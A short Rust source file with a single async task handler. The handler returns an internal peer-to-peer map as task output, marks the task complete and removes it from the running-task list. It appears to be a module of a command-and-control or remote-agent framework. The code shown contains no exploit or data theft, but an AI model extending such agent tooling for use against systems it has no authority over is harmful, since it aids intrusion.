use crate::structs::Task;
use crate::utils;

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    response.user_output = utils::p2p::get_internal_p2p_map();
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
